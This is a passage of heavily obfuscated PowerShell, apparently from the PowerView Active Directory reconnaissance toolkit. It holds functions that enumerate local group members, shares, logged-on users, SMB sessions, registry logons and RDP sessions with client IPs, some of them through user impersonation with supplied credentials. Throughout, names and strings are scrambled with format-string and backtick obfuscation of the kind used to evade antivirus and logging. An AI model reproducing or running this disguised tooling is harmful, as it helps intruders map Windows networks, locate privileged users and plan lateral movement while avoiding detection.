                    ${Ma`cHI`NESiD} = ${M`EM`BERs} | &("{1}{2}{0}"-f'Object','Where','-') {${_}."s`ID" -match ("{1}{0}{2}" -f'*-50','.','0') -or (${_}."S`id" -match ("{1}{2}{0}"-f '01','.','*-5'))} | &("{2}{4}{3}{1}{0}"-f'ct','e','Se','bj','lect-O') -Expand ("{1}{0}" -f 'ID','S')
                    if (${ma`c`hI`NEsiD}) {
                        ${m`AC`hInESId} = ${m`AChIN`eS`iD}.("{0}{2}{1}" -f'S','string','ub').Invoke(0, ${maChine`S`Id}.("{2}{1}{0}"-f'xOf','stInde','La').Invoke('-'))

                        ${ME`m`BERs} | &("{2}{0}{1}" -f 'ach-Obj','ect','ForE') {
                            if (${_}."S`id" -match ${mAC`H`In`esID}) {
                                ${_} | &("{0}{2}{1}"-f 'Ad','ember','d-M') ("{0}{1}{3}{2}"-f'Notep','rop','rty','e') ("{2}{0}{1}"-f'om','ain','IsD') ${FA`lsE}
                            }
                            else {
                                ${_} | &("{1}{2}{0}" -f'mber','Add','-Me') ("{2}{3}{1}{0}"-f'erty','eprop','No','t') ("{1}{0}{2}" -f'ma','IsDo','in') ${Tr`UE}
                            }
                        }
                    }
                    else {
                        ${M`E`MBERS} | &("{2}{1}{0}{4}{3}"-f 'h-','Eac','For','ject','Ob') {
                            if (${_}."S`Id" -notmatch ("{0}{1}"-f 'S-1','-5-21')) {
                                ${_} | &("{0}{2}{1}"-f'Ad','ember','d-M') ("{2}{0}{1}{3}"-f'tep','ropert','No','y') ("{2}{0}{1}" -f 'Do','main','Is') ${FAl`sE}
                            }
                            else {
                                ${_} | &("{0}{1}{2}" -f'Add-Mem','b','er') ("{0}{2}{1}"-f'Notepr','y','opert') ("{2}{1}{0}" -f 'ain','om','IsD') ("{0}{1}"-f'UNKNO','WN')
                            }
                        }
                    }
                    ${ME`MB`ERs}
                }
                else {
                    &("{0}{3}{2}{1}"-f'Wri','e','rbos','te-Ve') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {

                try {
                    ${G`ROUpprOVi`d`eR} = [ADSI]"WinNT://$Computer/$GroupName,group"

                    ${gROup`PRov`I`DEr}."P`Sba`Se"."i`NV`OKe"(("{0}{1}"-f'Member','s')) | &("{0}{3}{4}{1}{2}"-f 'Fo','Ob','ject','rEa','ch-') {

                        ${me`MbEr} = &("{2}{0}{1}{3}" -f'-O','bje','New','ct') ("{0}{1}" -f 'PSObje','ct')
                        ${MEm`BEr} | &("{0}{1}{2}{3}" -f 'Add-M','e','mbe','r') ("{1}{0}{2}"-f'ert','Noteprop','y') ("{3}{1}{2}{0}"-f 'e','omputerN','am','C') ${cOmP`U`Ter}
                        ${m`Em`BER} | &("{1}{2}{0}" -f'd-Member','A','d') ("{2}{0}{1}" -f 'ep','roperty','Not') ("{0}{2}{1}" -f 'G','oupName','r') ${g`ROUp`NAME}

                        ${lOcaLU`s`Er} = ([ADSI]${_})
                        ${Ad`sp`AtH} = ${lOcalU`S`Er}.("{0}{1}"-f 'InvokeGe','t').Invoke(("{0}{1}" -f'AdsP','ath')).("{0}{1}{2}"-f 'Re','p','lace').Invoke(("{0}{2}{1}"-f 'WinN','//','T:'), '')
                        ${Is`Gr`oUp} = (${lOCalu`S`ER}."schEM`ACLa`sSNA`ME" -like ("{1}{0}" -f 'p','grou'))

                        if(( ${s1t0`6y}::("{0}{1}{2}" -f'Matc','h','es').Invoke(${a`Dspa`TH}, '/'))."cou`Nt" -eq 1) {

                            ${MembE`R`isDOMa`iN} = ${tr`UE}
                            ${nA`me} = ${aD`SPa`TH}.("{2}{0}{1}"-f'e','place','R').Invoke('/', '\')
                        }
                        else {

                            ${m`Em`BEriS`dOMA`in} = ${f`AlSE}
                            ${Na`Me} = ${AD`s`pATH}.("{2}{1}{0}" -f'ing','bstr','Su').Invoke(${ADspA`TH}.("{0}{1}" -f 'IndexO','f').Invoke('/')+1).("{0}{1}"-f 'Rep','lace').Invoke('/', '\')
                        }

                        ${m`eMB`Er} | &("{1}{0}{2}" -f'-Memb','Add','er') ("{0}{1}{2}" -f'Notepro','pe','rty') ("{2}{0}{3}{1}" -f'c','ntName','Ac','ou') ${NA`mE}
                        ${m`EMb`Er} | &("{1}{0}{2}" -f 'M','Add-','ember') ("{2}{0}{1}" -f'proper','ty','Note') 'SID' ((&("{2}{1}{0}" -f'bject','-O','New') ("{0}{7}{8}{6}{5}{3}{2}{1}{4}" -f'Sy','fie','tyIdenti','i','r','pal.Secur','ci','ste','m.Security.Prin')(${l`O`cALUSer}.("{1}{2}{0}" -f'Get','Inv','oke').Invoke(("{2}{1}{0}"-f 'tSID','bjec','O')),0))."VA`LUe")
                        ${M`emb`eR} | &("{1}{2}{0}" -f 'er','A','dd-Memb') ("{1}{0}{2}{3}"-f'r','Notep','o','perty') ("{0}{1}{2}" -f'I','s','Group') ${i`S`groUp}
                        ${m`EmbER} | &("{0}{2}{1}{3}"-f'Add-','m','Me','ber') ("{0}{2}{1}{3}"-f'Not','p','e','roperty') ("{0}{1}{2}"-f 'Is','Do','main') ${M`eM`BeR`ISdo`MAiN}

                        ${m`e`MBEr}
                    }
                }
                catch {
                    &("{2}{0}{3}{1}" -f 'e','rbose','Writ','-Ve') ('[Get-N'+'etLocalGr'+'oupMemb'+'er'+'] '+'Er'+'ror '+'f'+'or '+"$Computer "+': '+"$_")
                }
            }
        }
    }

    END {
        if (${Lo`Gon`Token}) {
            &("{0}{4}{3}{1}{2}"-f'In','rtTo','Self','ve','voke-Re') -TokenHandle ${lO`Go`NT`OKEn}
        }
    }
}

function G`Et-`NE`TshaRE {
    [OutputType({"{4}{2}{1}{3}{5}{0}"-f 'eInfo','Sh','rView.','a','Powe','r'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitioN = 0, vALuefroMPIpelinE = ${tr`Ue}, VaLuEfrOmPipeliNeBYpRopertYNAme = ${tR`Ue})]
        [Alias({"{0}{1}" -f 'HostN','ame'}, {"{3}{2}{0}{1}" -f'o','stname','nsh','d'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`OM`P`UT`erNAMe} = ("{1}{0}{2}"-f 'alho','loc','st'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`ede`NtiAL} =   ${PK`FE`Zn}::"em`pTY"
    )

    BEGIN {
        if (${psbounDP`ARa`m`ETerS}[("{2}{0}{1}" -f'nt','ial','Crede')]) {
            ${lOgO`Ntok`En} = &("{4}{0}{2}{3}{1}" -f 'oke','ion','-Us','erImpersonat','Inv') -Credential ${c`R`EdENTiAL}
        }
    }

    PROCESS {
        ForEach (${Comp`U`TEr} in ${co`M`PuTE`RNAme}) {

            ${Q`UEryle`V`el} = 1
            ${PtRi`NFo} =  ${h`DICU}::"zE`Ro"
            ${entRIe`S`R`EaD} = 0
            ${Tot`A`LrEAd} = 0
            ${r`ESUm`e`H`ANDle} = 0

            ${rE`sulT} = ${n`ETapi`32}::"N`E`Ts`hAReENum"(${cOM`p`UTer}, ${queR`yL`eVel}, [ref]${pTri`NFo}, -1, [ref]${E`NTriesre`Ad}, [ref]${T`o`TAlREaD}, [ref]${RE`s`UmEhan`DLE})

            ${OfF`SET} = ${Pt`R`iNfO}.("{0}{2}{1}" -f'ToI','4','nt6').Invoke()

            if ((${R`eSuLt} -eq 0) -and (${Off`sEt} -gt 0)) {

                ${i`Nc`REmENT} = ${S`h`Are_IN`FO_1}::("{2}{0}{1}"-f'iz','e','GetS').Invoke()

                for (${i} = 0; (${i} -lt ${Ent`RiESr`EAD}); ${I}++) {

                    ${NewI`NTP`TR} = &("{0}{2}{1}" -f 'New-O','ect','bj') ("{1}{3}{4}{2}{0}"-f 'tr','System','p','.In','t') -ArgumentList ${oFf`sET}
                    ${IN`FO} = ${NEwi`N`TpTR} -as ${Sh`ARe_i`N`FO_1}

                    ${s`Hare} = ${In`FO} | &("{4}{3}{0}{1}{2}"-f 'b','je','ct','lect-O','Se') ('*')
                    ${shA`Re} | &("{1}{3}{2}{0}"-f'er','Add-Me','b','m') ("{0}{2}{1}" -f'Notep','y','ropert') ("{1}{2}{3}{0}"-f'me','Comput','erN','a') ${c`OmpuTeR}
                    ${s`h`ARE}."p`s`oBjECT"."tY`p`EnA`mEs".("{0}{2}{1}" -f'In','t','ser').Invoke(0, ("{1}{2}{4}{3}{0}"-f'o','P','o','areInf','werView.Sh'))
                    ${of`F`set} = ${N`EwiNt`Ptr}.("{1}{2}{0}"-f't64','T','oIn').Invoke()
                    ${o`FFs`eT} += ${IN`CREme`NT}
                    ${s`ha`RE}
                }

                ${nU`lL} = ${Ne`TaPi`32}::("{1}{4}{2}{3}{0}"-f 'ree','Ne','piBuffer','F','tA').Invoke(${pTri`N`Fo})
            }
            else {
                &("{2}{3}{0}{1}"-f 'o','se','Wri','te-Verb') "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${Logon`TO`K`en}) {
            &("{4}{1}{0}{3}{2}"-f'oS','voke-RevertT','lf','e','In') -TokenHandle ${l`OgO`NTO`kEn}
        }
    }
}

function GET-N`eTLo`gg`EdoN {
    [OutputType({"{6}{5}{4}{1}{2}{0}{3}" -f'U','w','.LoggedOn','serInfo','e','rVi','Powe'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITioN = 0, VALuEfrOMPipELINE = ${TR`Ue}, VALueFroMpipELInEBYpRoPertYNAme = ${tR`UE})]
        [Alias({"{0}{2}{1}"-f'HostN','e','am'}, {"{1}{2}{0}"-f'name','dnshos','t'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COmPut`e`R`NaME} = ("{1}{0}"-f 'st','localho'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`DE`NtiAL} =   ${PK`FeZN}::"EMP`TY"
    )

    BEGIN {
        if (${P`SBOUn`dPar`AmETers}[("{2}{1}{0}"-f 'al','enti','Cred')]) {
            ${l`OG`on`TOKEn} = &("{2}{1}{0}{6}{4}{3}{5}" -f 'e-Use','nvok','I','mp','I','ersonation','r') -Credential ${Cr`eDE`N`TIAL}
        }
    }

    PROCESS {
        ForEach (${Com`PU`TeR} in ${Co`mputE`Rn`AmE}) {

            ${qU`ErY`LEveL} = 1
            ${P`TR`info} =  ( &("{1}{0}" -f'e','vaRiAbL')  ('h'+'dIcu')  -vAlUeo )::"Z`ErO"
            ${E`NTR`iesrE`Ad} = 0
            ${T`otal`Re`Ad} = 0
            ${REs`U`mEH`AN`dLE} = 0

            ${r`Es`ULT} = ${n`Et`A`PI32}::"N`E`TW`ks`TaUseREnUm"(${C`omput`ER}, ${Qu`e`R`YLEvel}, [ref]${PT`RiN`FO}, -1, [ref]${enT`RiE`S`ReAd}, [ref]${T`OtA`lreAd}, [ref]${R`eSu`MeHAndLE})

            ${oF`Fs`eT} = ${Pt`RIN`Fo}.("{1}{0}{2}" -f'oI','T','nt64').Invoke()

            if ((${R`E`sUlT} -eq 0) -and (${o`FFseT} -gt 0)) {

                ${IN`cR`eMeNt} = ${wKsTA_u`sER`_i`NfO_1}::("{1}{0}" -f 'Size','Get').Invoke()

                for (${I} = 0; (${i} -lt ${enTr`iesre`Ad}); ${i}++) {

                    ${NE`wi`Nt`Ptr} = &("{2}{1}{0}" -f'bject','w-O','Ne') ("{2}{0}{1}"-f't','r','System.Intp') -ArgumentList ${OffS`ET}
                    ${iN`FO} = ${ne`W`iNt`pTR} -as ${W`KsTA_Us`E`R_InFo_1}

                    ${L`oG`Gedon} = ${in`Fo} | &("{0}{3}{1}{2}"-f 'Se','c','t','lect-Obje') ('*')
                    ${L`o`ggEdOn} | &("{0}{2}{3}{1}"-f 'Add-Me','er','m','b') ("{2}{1}{0}"-f'perty','tepro','No') ("{1}{2}{0}{3}" -f'terN','Comp','u','ame') ${COM`pu`TeR}
                    ${log`GE`Don}."PSobjE`ct"."TypeN`Am`eS".("{1}{0}" -f'nsert','I').Invoke(0, ("{2}{0}{1}{4}{3}" -f'ower','View.Logge','P','rInfo','dOnUse'))
                    ${O`FF`seT} = ${n`E`winT`ptr}.("{2}{0}{1}" -f 'Int','64','To').Invoke()
                    ${o`F`FsET} += ${In`cr`EmENt}
                    ${lO`GGe`Don}
                }

                ${NU`LL} = ${N`ETAP`I32}::("{2}{1}{3}{0}"-f 'ree','ApiBuffer','Net','F').Invoke(${p`Tri`NFo})
            }
            else {
                &("{1}{2}{0}"-f'-Verbose','Wr','ite') "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${loGoN`Tok`en}) {
            &("{0}{4}{3}{2}{1}" -f'Invok','lf','Se','-RevertTo','e') -TokenHandle ${lOGONTO`K`En}
        }
    }
}

function Get-n`ETse`S`sIOn {
    [OutputType({"{5}{4}{0}{6}{2}{1}{3}"-f'erView.Ses','n','onI','fo','ow','P','si'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItion = 0, ValuEFROMpipELine = ${Tr`Ue}, ValuefROMpiPeliNeBYproPErtynAMe = ${TR`Ue})]
        [Alias({"{1}{0}"-f'Name','Host'}, {"{1}{3}{0}{2}" -f'nam','dn','e','shost'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`MP`UtE`RnAme} = ("{2}{0}{1}"-f'ocalhos','t','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDENT`iAl} =   ${pKFE`Zn}::"e`MptY"
    )

    BEGIN {
        if (${PSBo`U`Nd`paraMEte`RS}[("{0}{1}{2}{3}" -f'C','re','denti','al')]) {
            ${lo`g`oNtOken} = &("{5}{2}{3}{4}{0}{1}" -f 'natio','n','vo','ke-Us','erImperso','In') -Credential ${cR`Ed`entiaL}
        }
    }

    PROCESS {
        ForEach (${co`MPUT`ER} in ${Co`MPu`TE`RnAME}) {

            ${QUEr`Y`leveL} = 10
            ${PT`R`iNfO} =   ${Hd`ICU}::"z`ErO"
            ${e`NTr`ieS`ReaD} = 0
            ${Tot`A`LRE`AD} = 0
            ${R`esumehAn`dle} = 0

            ${RE`s`UlT} = ${nET`Api`32}::"n`E`T`SESSionENUm"(${coMP`UT`Er}, '', ${U`s`Er`NamE}, ${quer`YL`eVEL}, [ref]${PT`RINfO}, -1, [ref]${eN`Tr`IES`REad}, [ref]${t`oTALrE`AD}, [ref]${RES`U`m`EhA`NDlE})

            ${O`FFSEt} = ${P`Tr`iNfo}.("{1}{0}" -f 'oInt64','T').Invoke()

            if ((${r`ESulT} -eq 0) -and (${of`FS`Et} -gt 0)) {

                ${In`CREM`ENt} = ${seSsI`on`_i`NF`o_10}::("{0}{1}{2}" -f 'G','etSi','ze').Invoke()

                for (${i} = 0; (${I} -lt ${ENt`RI`EsrEAd}); ${I}++) {

                    ${N`ew`iNtpTR} = &("{1}{0}{2}" -f 'j','New-Ob','ect') ("{2}{0}{1}" -f 'y','stem.Intptr','S') -ArgumentList ${OffS`et}
                    ${i`NfO} = ${new`iN`TPTR} -as ${seSSiOn_I`Nf`O`_10}

                    ${se`SsioN} = ${in`FO} | &("{2}{0}{1}"-f 'jec','t','Select-Ob') ('*')
                    ${seSs`ioN} | &("{0}{2}{1}" -f'A','Member','dd-') ("{0}{1}{2}" -f'Notep','roper','ty') ("{3}{2}{1}{0}" -f 'ame','uterN','omp','C') ${coM`pUtER}
                    ${sesS`I`on}."PSOBj`e`Ct"."tYPen`Am`eS".("{1}{0}"-f'ert','Ins').Invoke(0, ("{1}{5}{3}{2}{0}{4}" -f'ssi','Pow','w.Se','Vie','onInfo','er'))
                    ${o`FFSeT} = ${NEWi`N`Tp`Tr}.("{1}{0}"-f'Int64','To').Invoke()
                    ${OFF`Set} += ${incr`eM`eNT}
                    ${SesSI`oN}
                }

                ${NU`ll} = ${Ne`Ta`pi`32}::("{0}{3}{4}{2}{1}"-f'N','ee','Fr','etApi','Buffer').Invoke(${ptri`N`FO})
            }
            else {
                &("{1}{2}{3}{0}" -f 'e','Write','-Verb','os') "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${lo`G`o`NtOKen}) {
            &("{2}{1}{0}{5}{4}{3}"-f'v','nvoke-Re','I','f','rtToSel','e') -TokenHandle ${lO`Gont`oK`eN}
        }
    }
}

function GET-R`E`gloggE`D`ON {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}" -f 's','PSShoul','dProce','s'}, '')]
    [OutputType({"{5}{1}{2}{4}{0}{3}{6}"-f 'e','ow','erView.Re','dOnUse','gLogg','P','r'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSItion = 0, vaLUeFromPipeLIne = ${t`RUE}, VALUefROMpIPELiNeBYPropERTynaMe = ${tr`Ue})]
        [Alias({"{0}{1}"-f'HostNa','me'}, {"{1}{3}{0}{2}"-f'n','dns','ame','host'}, {"{1}{0}" -f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`Om`puteR`NAme} = ("{0}{1}{2}" -f 'l','ocalh','ost')
    )

    BEGIN {
        if (${pSboUndpARAm`ET`e`Rs}[("{2}{0}{1}" -f'nt','ial','Crede')]) {
            ${L`og`O`NToKEN} = &("{3}{2}{5}{4}{1}{0}"-f 'ion','nat','-U','Invoke','rImperso','se') -Credential ${C`REdent`ial}
        }
    }

    PROCESS {
        ForEach (${c`O`MPUteR} in ${COmp`UTER`N`AmE}) {
            try {

                ${r`eg} =  ${c`E1m}::("{3}{1}{0}{4}{2}"-f'Remo','en','seKey','Op','teBa').Invoke(("{1}{0}"-f'ers','Us'), "$ComputerName")

                ${R`EG}.("{1}{3}{2}{4}{0}" -f'es','GetSubKey','a','N','m').Invoke() | &("{0}{2}{1}" -f 'Wh','ject','ere-Ob') { ${_} -match (('S-1-5-21-'+'[0-'+'9'+']+-'+'['+'0-9]'+'+'+'-[0-9'+']+-[0'+'-'+'9]+{'+'0}') -F [ChAr]36) } | &("{1}{2}{3}{4}{0}" -f'ject','ForEac','h-','O','b') {
                    ${us`ERname} = &("{1}{0}{2}"-f'From-SI','Convert','D') -ObjectSID ${_} -OutputType ("{1}{2}{0}"-f 'le','D','omainSimp')

                    if (${u`sErNA`me}) {
                        ${UsE`RN`AMe}, ${u`SERd`O`mAIN} = ${uSE`Rn`AmE}.("{1}{0}"-f 'it','Spl').Invoke('@')
                    }
                    else {
                        ${Us`e`R`NAMe} = ${_}
                        ${Use`R`DoMAIN} = ${N`Ull}
                    }

                    ${reg`LoG`geDOnU`SeR} = &("{2}{0}{1}"-f'-','Object','New') ("{0}{2}{1}" -f 'P','ject','SOb')
                    ${R`E`GlO`gGe`dOnUSer} | &("{3}{2}{0}{1}" -f 'be','r','dd-Mem','A') ("{2}{0}{1}"-f'roper','ty','Notep') ("{2}{1}{0}" -f 'me','uterNa','Comp') "$ComputerName"
                    ${regL`oGge`d`ONuSER} | &("{3}{2}{0}{1}" -f 'emb','er','d-M','Ad') ("{1}{2}{0}" -f'eproperty','N','ot') ("{1}{2}{3}{0}" -f 'ain','U','ser','Dom') ${USe`R`Do`Main}
                    ${RegLo`GgE`DOnUS`eR} | &("{3}{0}{1}{2}"-f'dd-','Mem','ber','A') ("{1}{2}{0}" -f 'rty','No','teprope') ("{0}{1}{2}"-f 'User','N','ame') ${u`serN`AME}
                    ${rEg`LOGgeDON`U`sEr} | &("{2}{1}{0}" -f'ber','d-Mem','Ad') ("{2}{0}{1}"-f 'pert','y','Notepro') ("{2}{0}{1}"-f 'serSI','D','U') ${_}
                    ${Regl`ogg`E`dOn`USEr}."PS`ObjE`cT"."Type`NAM`ES".("{0}{1}" -f'In','sert').Invoke(0, ("{5}{0}{3}{4}{6}{2}{1}"-f'erView.','r','e','RegLog','ged','Pow','OnUs'))
                    ${R`e`GLOGgeDOn`U`sER}
                }
            }
            catch {
                &("{2}{1}{0}" -f'erbose','ite-V','Wr') ('['+'Get'+'-Reg'+'L'+'oggedOn] '+'Err'+'or '+'ope'+'ni'+'ng '+'r'+'emote '+'r'+'eg'+'istry '+'o'+'n '+"'$ComputerName' "+': '+"$_")
            }
        }
    }

    END {
        if (${l`OgONtO`K`en}) {
            &("{2}{1}{3}{0}"-f 'tToSelf','ev','Invoke-R','er') -TokenHandle ${L`og`oNT`okEn}
        }
    }
}

function gE`T-NETRD`P`sESSI`oN {
    [OutputType({"{1}{5}{4}{2}{0}{3}" -f 'P','P','.RD','SessionInfo','iew','owerV'})]
    [CmdletBinding()]
    Param(
        [Parameter(posITIoN = 0, ValuEFrompipEliNe = ${TR`UE}, ValUeFromPIpEliNEByPROPertYNaMe = ${TR`Ue})]
        [Alias({"{1}{0}{2}"-f'N','Host','ame'}, {"{0}{2}{1}" -f'dn','stname','sho'}, {"{0}{1}" -f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`MPu`TE`RnAMe} = ("{1}{2}{0}" -f'st','localh','o'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEDe`Nti`Al} =   ${PKf`Ezn}::"E`mpTY"
    )

    BEGIN {
        if (${ps`B`oUND`PARaMETERS}[("{2}{0}{3}{1}"-f'rede','tial','C','n')]) {
            ${LogOn`To`keN} = &("{4}{0}{3}{2}{5}{1}"-f 'o','ion','serImperson','ke-U','Inv','at') -Credential ${c`ReDe`Ntial}
        }
    }

    PROCESS {
        ForEach (${cOM`PUT`er} in ${CompU`Te`RnAME}) {

            ${H`ANd`LE} = ${wT`S`Api32}::("{4}{0}{3}{1}{2}"-f 'SO','n','ServerEx','pe','WT').Invoke(${CoMp`UT`eR})

            if (${Ha`Nd`LE} -ne 0) {

                ${p`PSe`ss`IO`NInFO} =  ${Hdi`cu}::"zE`Ro"
                ${PCO`Unt} = 0

                ${rESu`Lt} = ${w`Ts`APi32}::"WTseNu`Me`RA`TeSESSI`onSEx"(${H`A`NDle}, [ref]1, 0, [ref]${pPse`SSIo`Ni`NFo}, [ref]${PcOU`Nt});${lAS`TE`RROR} =   ${d`UR8}::("{1}{0}{3}{4}{2}"-f 'e','G','or','tLastWin','32Err').Invoke()

                ${O`FFSEt} = ${PpSesS`Io`N`I`Nfo}.("{2}{0}{1}" -f'oI','nt64','T').Invoke()

                if ((${REs`U`lT} -ne 0) -and (${OFf`S`et} -gt 0)) {

                    ${incRe`Me`Nt} = ${WTs_`s`E`sSiO`N`_INFo_1}::("{1}{0}"-f 'ize','GetS').Invoke()

                    for (${i} = 0; (${I} -lt ${PC`o`UnT}); ${I}++) {

                        ${ne`W`intPtR} = &("{1}{0}{2}"-f'w','Ne','-Object') ("{2}{3}{0}{1}" -f'em.Int','ptr','S','yst') -ArgumentList ${oFfS`et}
                        ${iN`FO} = ${Ne`W`iNT`ptR} -as ${w`TS_s`essiO`N_i`NFO_1}

                        ${rdPsEss`i`ON} = &("{2}{1}{0}"-f 't','w-Objec','Ne') ("{1}{2}{0}"-f 't','PS','Objec')

                        if (${i`Nfo}."P`hoSt`Name") {
                            ${RdpS`e`ssIon} | &("{1}{0}{2}"-f '-Memb','Add','er') ("{3}{2}{0}{1}"-f 'e','rty','teprop','No') ("{3}{1}{0}{2}" -f 'er','ut','Name','Comp') ${I`Nfo}."p`h`o`sTName"
                        }
                        else {

                            ${R`DpS`eSSI`on} | &("{1}{0}{2}"-f 'dd-','A','Member') ("{0}{1}{2}"-f 'No','tepr','operty') ("{2}{1}{0}{3}" -f 'uterNa','omp','C','me') ${c`omP`UTER}
                        }

                        ${rDP`SE`SSI`on} | &("{1}{2}{0}"-f'r','Add-Mem','be') ("{3}{1}{0}{2}"-f 'epro','ot','perty','N') ("{0}{1}{2}{3}" -f'Se','s','sionN','ame') ${i`NFO}."ps`EsSiO`Nname"

                        if ($(-not ${iN`Fo}."PD`OM`AInN`AmE") -or (${In`FO}."pD`OmAin`N`AMe" -eq '')) {

                            ${r`DPsES`siON} | &("{0}{1}{2}"-f 'Add-M','em','ber') ("{1}{3}{0}{2}" -f'pro','Not','perty','e') ("{1}{0}"-f 'ame','UserN') "$($Info.pUserName)"
                        }
                        else {
                            ${RD`pSEs`SI`on} | &("{2}{0}{1}"-f '-Memb','er','Add') ("{2}{1}{3}{0}" -f'ty','otepr','N','oper') ("{0}{2}{1}" -f 'Us','Name','er') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        ${rd`Ps`eSSi`On} | &("{1}{2}{0}" -f 'mber','Ad','d-Me') ("{0}{1}{2}{3}"-f 'No','t','eprope','rty') 'ID' ${i`NFo}."sesS`iOn`Id"
                        ${RDPS`ES`s`IoN} | &("{0}{2}{1}"-f 'A','mber','dd-Me') ("{0}{3}{2}{1}"-f'Not','erty','rop','ep') ("{0}{1}"-f 'St','ate') ${In`FO}."st`ATe"

                        ${Ppb`UfF`Er} =   ${Hd`ICu}::"zE`RO"
                        ${PbYt`e`sRET`URNed} = 0

                        ${reSuL`T2} = ${W`T`SApi32}::"wt`SqueR`Yse`SSIO`Nin`FORMAtIOn"(${hAn`dle}, ${iN`FO}."sE`Ss`IoNId", 14, [ref]${PPBuF`F`eR}, [ref]${p`B`yT`esr`EtURneD});${laS`T`erR`oR2} =  (&("{0}{1}" -f 'g','CI')  ('vaRIa'+'blE:'+'d'+'Ur8')  )."V`AluE"::("{3}{4}{1}{2}{0}"-f'rror','3','2E','Ge','tLastWin').Invoke()

                        if (${R`E`SuLt2} -eq 0) {
                            &("{2}{1}{0}"-f 'Verbose','rite-','W') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            ${of`FSE`T2} = ${pPb`UF`FER}.("{0}{1}"-f'ToInt','64').Invoke()
                            ${NeWin`TP`TR2} = &("{1}{0}{2}" -f'ew-Objec','N','t') ("{1}{3}{0}{2}" -f'.I','S','ntptr','ystem') -ArgumentList ${OF`Fse`T2}
                            ${In`FO2} = ${NEW`i`N`TptR2} -as ${W`T`S_Cli`eNT_a`DDrEss}

                            ${sO`U`RCEip} = ${I`N`FO2}."ADdr`Ess"
                            if (${sO`U`RCeiP}[2] -ne 0) {
                                ${S`oUrC`Eip} = [String]${S`O`UR`CEIp}[2]+'.'+[String]${SOUrCe`iP}[3]+'.'+[String]${SO`URCEip}[4]+'.'+[String]${sO`URC`EiP}[5]
                            }
                            else {
                                ${S`ou`RceIP} = ${n`Ull}
                            }

                            ${RdP`SE`ss`ion} | &("{1}{0}{2}" -f 'dd-Membe','A','r') ("{0}{2}{1}"-f 'Not','operty','epr') ("{1}{2}{0}"-f'P','Sourc','eI') ${s`oUR`CeIp}
                            ${RDPs`es`SIoN}."Ps`obj`ECt"."ty`peNAMEs".("{1}{2}{0}"-f'rt','Ins','e').Invoke(0, ("{0}{1}{5}{3}{4}{2}"-f'Po','werView','o','Sess','ionInf','.RDP'))
                            ${rdP`seS`s`iON}

                            ${N`Ull} = ${Wt`SaPI`32}::("{0}{3}{2}{1}"-f'W','ry','Memo','TSFree').Invoke(${pp`BU`FFEr})

                            ${o`F`Fset} += ${I`NCr`Ement}
                        }
                    }

                    ${N`Ull} = ${wTS`Api32}::("{0}{2}{3}{1}{4}" -f'WTSF','eMe','r','e','moryEx').Invoke(2, ${Pp`S`e`ssIo`NInFo}, ${Pc`O`UNT})
                }
                else {
                    &("{1}{4}{2}{3}{0}" -f'e','W','te-V','erbos','ri') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }

                ${N`Ull} = ${WT`SaPI`32}::("{0}{1}{2}" -f'WTSClo','seSer','ver').Invoke(${Han`dlE})
            }
            else {
                &("{4}{0}{2}{1}{3}"-f'te-Ve','o','rb','se','Wri') ('[G'+'et-'+'NetRD'+'P'+'Ses'+'si'+'on] '+'E'+'rror '+'o'+'p'+'ening '+'the'+' '+'Re'+'mote'+' '+'Desktop'+' '+'Sessi'+'on '+'Hos'+'t '+'('+'RD '+'Ses'+'sio'+'n '+'H'+'ost) '+'serve'+'r '+'fo'+'r: '+"$ComputerName")
            }
        }
    }

    END {
        if (${lOg`Ont`Ok`En}) {
            &("{1}{2}{0}{3}{4}" -f 'e','Invo','k','-Re','vertToSelf') -TokenHandle ${L`oGOnTO`KEn}
        }
    }
}

function T`es`T-A`DMiNaCc`Ess {
    [OutputType({"{2}{0}{3}{5}{4}{1}"-f 'Vie','ss','Power','w','e','.AdminAcc'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSITIon = 0, valuEFromPIpELINE = ${T`RUe}, vALUEFroMpiPeLInebYPrOpertYnAMe = ${Tr`Ue})]
        [Alias({"{2}{1}{0}"-f 'tName','s','Ho'}, {"{0}{1}{2}" -f'dnsh','os','tname'}, {"{1}{0}" -f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`mp`UTer`NAmE} = ("{1}{2}{0}"-f'calhost','l','o'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crED`E`N`TIAL} =  (&("{1}{0}"-f 'Iable','vAr')  ("{0}{1}" -f 'PK','fEzN') -vALUEOnly  )::"eMp`Ty"
    )

    BEGIN {
        if (${ps`Bou`N`dpA`R`AMeters}[("{2}{3}{0}{1}" -f 'nti','al','Cred','e')]) {
            ${l`og`Onto`KEn} = &("{5}{4}{3}{6}{0}{1}{2}" -f 'pers','onatio','n','oke-Us','nv','I','erIm') -Credential ${CReDE`N`TIal}
        }
    }

    PROCESS {
        ForEach (${C`oMPuT`Er} in ${c`OmpU`Ter`NaMe}) {

